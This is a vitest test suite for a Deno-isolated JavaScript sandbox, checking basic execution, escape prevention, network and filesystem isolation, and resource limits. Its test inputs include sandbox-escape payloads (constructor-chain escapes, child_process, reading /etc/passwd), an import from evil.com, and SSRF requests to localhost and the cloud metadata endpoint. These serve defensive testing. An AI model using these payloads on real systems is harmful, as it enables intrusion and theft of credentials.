

import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import { runInDeno, checkDenoAvailability, sanitizeSettingsForSandbox } from '../deno_sandbox'
import { getSandboxMode } from '../jsvm'

let denoAvailable = false

beforeAll(async () => {
  const version = await checkDenoAvailability()
  denoAvailable = version !== null
  if (denoAvailable) {
    console.log(`[test] Deno detected: v${version}`)
  } else {
    console.log('[test] Deno not available — isolated-mode tests will be skipped')
  }
})

function itIsolated(name: string, fn: () => Promise<void>, timeout?: number) {
  it(name, async () => {
    if (!denoAvailable) return
    await fn()
  }, timeout)
}
describe('Isolated Mode — Basic Execution', () => {
  itIsolated('should execute simple arithmetic', async () => {
    const result = await runInDeno('return 1 + 1', {}, { mode: 'code', timeoutMs: 10000 })
    expect(result.success).toBe(true)
    expect(result.result).toBe(2)
  }, 15000)

  itIsolated('should access input data', async () => {
    const result = await runInDeno(
      'return input.x + input.y',
      { input: { x: 10, y: 20 } },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(30)
  }, 15000)

  itIsolated('should capture console.log output', async () => {
    const result = await runInDeno(
      'console.log("hello from sandbox"); return 42',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(42)
    expect(result.logs).toContain('hello from sandbox')
  }, 15000)

  itIsolated('should handle string operations', async () => {
    const result = await runInDeno(
      'return input.name.toUpperCase()',
      { input: { name: 'tspoonbase' } },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('TSPOONBASE')
  }, 15000)

  itIsolated('should evaluate condition expressions (true)', async () => {
    const result = await runInDeno(
      'input.age > 18',
      { input: { age: 25 } },
      { mode: 'condition', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(true)
  }, 15000)

  itIsolated('should evaluate condition expressions (false)', async () => {
    const result = await runInDeno(
      'input.age > 18',
      { input: { age: 10 } },
      { mode: 'condition', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(false)
  }, 15000)
})



describe('Isolated Mode — Sandbox Escape Prevention', () => {
  itIsolated('C-2: should block arguments.callee.constructor escape (strict mode)', async () => {
    const result = await runInDeno(
      'return arguments.callee.constructor("return Deno")()',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  }, 15000)

  itIsolated('should block prototype chain escape via this.constructor.constructor', async () => {
    const result = await runInDeno(
      'return this.constructor.constructor("return process")()',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).not.toHaveProperty('env')
      expect(result.result).not.toHaveProperty('exit')
    }
  }, 15000)

  itIsolated('should block concatenation-based constructor bypass', async () => {
    const result = await runInDeno(
      'const c = "con"+"structor"; return this[c][c]("return process")()',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).not.toHaveProperty('exit')
    }
  }, 15000)

  itIsolated('should deny process access', async () => {
    const result = await runInDeno(
      'return typeof process !== "undefined" ? process.env : "blocked"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('blocked')
  }, 15000)

  itIsolated('should deny require access', async () => {
    const result = await runInDeno(
      'return require("child_process")',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny Deno API access', async () => {
    const result = await runInDeno(
      'return Deno.readTextFileSync("/etc/passwd")',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny eval access', async () => {
    const result = await runInDeno(
      'return eval("1+1")',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny Function constructor access', async () => {
    const result = await runInDeno(
      'return Function("return 1+1")()',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny globalThis access', async () => {
    const result = await runInDeno(
      'return typeof globalThis !== "undefined" ? Object.keys(globalThis) : "blocked"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).toBe('blocked')
    }
  }, 15000)

  itIsolated('should deny Reflect access', async () => {
    const result = await runInDeno(
      'return typeof Reflect !== "undefined" ? "available" : "blocked"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).toBe('blocked')
    }
  }, 15000)

  itIsolated('should deny Proxy access', async () => {
    const result = await runInDeno(
      'return typeof Proxy !== "undefined" ? "available" : "blocked"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).toBe('blocked')
    }
  }, 15000)

  itIsolated('should block dynamic import()', async () => {
    const result = await runInDeno(
      'const m = await import("https://evil.com/pwn.js"); return m',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should block Error.stack information disclosure', async () => {
    const result = await runInDeno(
      'try { null.x } catch(e) { return e.stack }',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success && typeof result.result === 'string') {
      expect(result.result).not.toContain('/app/')
      expect(result.result).not.toContain('node_modules')
    }
  }, 15000)

  itIsolated('should block async generator abuse', async () => {
    const result = await runInDeno(
      'async function* g() { yield process }; const it = g(); return (await it.next()).value',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.result).toBeNull()
    }
  }, 15000)

  itIsolated('should block Symbol.unscopables abuse', async () => {
    const result = await runInDeno(
      'return typeof Symbol !== "undefined" && Symbol.unscopables ? "has_symbol" : "no_symbol"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
  }, 15000)
})


describe('Isolated Mode — Context Poisoning Prevention (C-1)', () => {
  itIsolated('C-1: should not allow overwriting console via context', async () => {
    const result = await runInDeno(
      'console.log("test"); return typeof console.log',
      { console: { log: 'POISONED' } as any },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('function')
    expect(result.logs.some(l => l.includes('[SECURITY]'))).toBe(true)
  }, 15000)

  itIsolated('C-1: should not allow overwriting JSON via context', async () => {
    const result = await runInDeno(
      'return typeof JSON.parse',
      { JSON: 'POISONED' as any },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('function')
  }, 15000)

  itIsolated('C-1: should not allow overwriting Array via context', async () => {
    const result = await runInDeno(
      'return Array.isArray([1,2,3])',
      { Array: 'POISONED' as any },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(true)
  }, 15000)

  itIsolated('C-1: should not allow overwriting Math via context', async () => {
    const result = await runInDeno(
      'return typeof Math.random',
      { Math: { random: () => 0.5 } as any },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('function')
  }, 15000)

  itIsolated('C-1: should not allow overwriting Deno shadow via context', async () => {
    const result = await runInDeno(
      'return typeof Deno',
      { Deno: { readTextFileSync: () => 'pwned' } as any },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('undefined')
  }, 15000)

  itIsolated('C-1: should not allow overwriting eval shadow via context', async () => {
    const result = await runInDeno(
      'return typeof eval',
      { eval: (x: string) => x } as any,
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe('undefined')
  }, 15000)

  itIsolated('C-1: safe context keys should still work', async () => {
    const result = await runInDeno(
      'return input.value + customKey',
      { input: { value: 10 }, customKey: 20 },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(30)
  }, 15000)
})


describe('Isolated Mode — Network Isolation', () => {
  itIsolated('should deny fetch (network access)', async () => {
    const result = await runInDeno(
      'const r = await fetch("https://httpbin.org/get"); return r.status',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny localhost SSRF', async () => {
    const result = await runInDeno(
      'const r = await fetch("http://127.0.0.1:8090/api/health"); return r.status',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny metadata endpoint SSRF', async () => {
    const result = await runInDeno(
      'const r = await fetch("http://169.254.169.254/latest/meta-data/"); return r.status',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)
})

describe('Isolated Mode — Filesystem Isolation', () => {
  itIsolated('should deny filesystem read', async () => {
    const result = await runInDeno(
      'return Deno.readTextFileSync("/etc/passwd")',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should deny filesystem write', async () => {
    const result = await runInDeno(
      'Deno.writeTextFileSync("/tmp/pwned.txt", "owned"); return "written"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('M-2: should deny reading worker source via prototype escape', async () => {
    const result = await runInDeno(
      'try { const D = this.constructor.constructor("return Deno")(); return D.readTextFileSync("/app/dist/tools/jsvm/deno_worker.ts") } catch(e) { return "blocked: " + e.message }',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(String(result.result)).toMatch(/blocked|denied|permission/i)
    }
  }, 15000)
})

describe('Isolated Mode — Resource Limits', () => {
  itIsolated('should enforce execution timeout (infinite loop)', async () => {
    const result = await runInDeno(
      'while(true) {}',
      {},
      { mode: 'code', timeoutMs: 3000 }
    )
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/timed out/i)
  }, 15000)

  itIsolated('should enforce memory limit (large allocation)', async () => {
    const result = await runInDeno(
      'const arr = []; for(let i = 0; i < 50000000; i++) arr.push(i); return arr.length',
      {},
      { mode: 'code', timeoutMs: 10000, maxMemoryMb: 32 }
    )
    expect(result.success).toBe(false)
  }, 20000)

  itIsolated('H-2: should handle stdout flooding without parent OOM', async () => {
    const result = await runInDeno(
      'for(let i = 0; i < 100000; i++) console.log("A".repeat(1000)); return "done"',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    if (result.success) {
      expect(result.logs.length).toBeLessThanOrEqual(500)
    }
  }, 15000)

  itIsolated('should enforce recursive loop timeout', async () => {
    const result = await runInDeno(
      'function r(n) { return r(n+1) }; return r(0)',
      {},
      { mode: 'code', timeoutMs: 5000 }
    )
    expect(result.success).toBe(false)
  }, 15000)
})

describe('Isolated Mode — Error Handling', () => {
  itIsolated('should handle syntax errors', async () => {
    const result = await runInDeno('return {{{', {}, { mode: 'code', timeoutMs: 10000 })
    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  }, 15000)

  itIsolated('should handle runtime errors', async () => {
    const result = await runInDeno(
      'return nonExistentVariable.foo',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should handle thrown errors', async () => {
    const result = await runInDeno(
      'throw new Error("intentional error")',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('intentional error')
  }, 15000)

  itIsolated('should handle empty code', async () => {
    const result = await runInDeno('', {}, { mode: 'code', timeoutMs: 10000 })
    expect(result.success).toBe(false)
  }, 15000)

  itIsolated('should handle Deno.exit() gracefully', async () => {
    const result = await runInDeno(
      'try { const D = this.constructor.constructor("return Deno")(); D.exit(0) } catch(e) { return "blocked" }',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result).toBeDefined()
  }, 15000)
})

describe('Isolated Mode — Logic Attacks', () => {
  itIsolated('should handle circular reference in result', async () => {
    const result = await runInDeno(
      'const obj = {}; obj.self = obj; return obj',
      {},
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result).toBeDefined()
  }, 15000)

  itIsolated('should handle large JSON payload in context', async () => {
    const largeInput: Record<string, string> = {}
    for (let i = 0; i < 1000; i++) {
      largeInput[`key_${i}`] = 'x'.repeat(100)
    }
    const result = await runInDeno(
      'return Object.keys(input).length',
      { input: largeInput },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
    expect(result.result).toBe(1000)
  }, 15000)

  itIsolated('should handle __proto__ in context (prototype pollution attempt)', async () => {
    const result = await runInDeno(
      'return typeof input.__proto__',
      { input: { __proto__: { polluted: true } } },
      { mode: 'code', timeoutMs: 10000 }
    )
    expect(result.success).toBe(true)
  }, 15000)
})

describe('Utility — sanitizeSettingsForSandbox (M-1 allowlist)', () => {
  it('should only include allowlisted fields', () => {
    const settings = {
      appName: 'TestApp',
      appUrl: 'http://localhost:8090',
      senderName: 'Test',
      senderAddress: 'test@example.com',
      hideControls: false,
      recordsPerPage: 20,
      defaultLanguage: 'en',
      jwtSecret: 'super-secret',
      encryptionKey: 'another-secret',
      smtpPassword: 'smtp-pass',
      smtpHost: 'smtp.example.com',
      smtpPort: 587,
      s3Secret: 's3-secret',
      s3AccessKey: 's3-key',
      s3Bucket: 'my-bucket',
      s3Region: 'us-east-1',
      s3Endpoint: 'https://s3.example.com',
      aiApiKey: 'ai-key',
      backups: { schedule: '* * * * *' },
      webhookSecret: 'webhook-secret',
      customNewField: 'should-be-excluded',
    }

    const sanitized = sanitizeSettingsForSandbox(settings)
    expect(sanitized.appName).toBe('TestApp')
    expect(sanitized.appUrl).toBe('http://localhost:8090')
    expect(sanitized.senderName).toBe('Test')
    expect(sanitized.senderAddress).toBe('test@example.com')
    expect(sanitized.hideControls).toBe(false)
    expect(sanitized.recordsPerPage).toBe(20)
    expect(sanitized.defaultLanguage).toBe('en')

    expect(sanitized.jwtSecret).toBeUndefined()
    expect(sanitized.encryptionKey).toBeUndefined()
    expect(sanitized.smtpPassword).toBeUndefined()
    expect(sanitized.smtpHost).toBeUndefined()
    expect(sanitized.s3Secret).toBeUndefined()
    expect(sanitized.s3AccessKey).toBeUndefined()
    expect(sanitized.aiApiKey).toBeUndefined()
    expect(sanitized.backups).toBeUndefined()

    expect(sanitized.webhookSecret).toBeUndefined()
    expect(sanitized.customNewField).toBeUndefined()
  })

  it('should handle null/undefined settings', () => {
    expect(sanitizeSettingsForSandbox(null)).toEqual({})
    expect(sanitizeSettingsForSandbox(undefined)).toEqual({})
  })
})

describe('Utility — getSandboxMode', () => {
  const originalEnv = process.env.JSVM_SANDBOX_MODE

  afterAll(() => {
    if (originalEnv !== undefined) {
      process.env.JSVM_SANDBOX_MODE = originalEnv
    } else {
      delete process.env.JSVM_SANDBOX_MODE
    }
  })

  it('should default to legacy when env is not set', () => {
    delete process.env.JSVM_SANDBOX_MODE
    expect(getSandboxMode()).toBe('legacy')
  })

  it('should return legacy when env is "legacy"', () => {
    process.env.JSVM_SANDBOX_MODE = 'legacy'
    expect(getSandboxMode()).toBe('legacy')
  })

  it('should return isolated when env is "isolated"', () => {
    process.env.JSVM_SANDBOX_MODE = 'isolated'
    expect(getSandboxMode()).toBe('isolated')
  })

  it('should be case-insensitive', () => {
    process.env.JSVM_SANDBOX_MODE = 'ISOLATED'
    expect(getSandboxMode()).toBe('isolated')
    process.env.JSVM_SANDBOX_MODE = 'Isolated'
    expect(getSandboxMode()).toBe('isolated')
  })

  it('should default to legacy for unknown values', () => {
    process.env.JSVM_SANDBOX_MODE = 'unknown'
    expect(getSandboxMode()).toBe('legacy')
  })
})

describe('Utility — checkDenoAvailability', () => {
  it('should return version string or null', async () => {
    const result = await checkDenoAvailability()
    if (result) {
      expect(result).toMatch(/^\d+\.\d+/)
    } else {
      expect(result).toBeNull()
    }
  }, 10000)
})
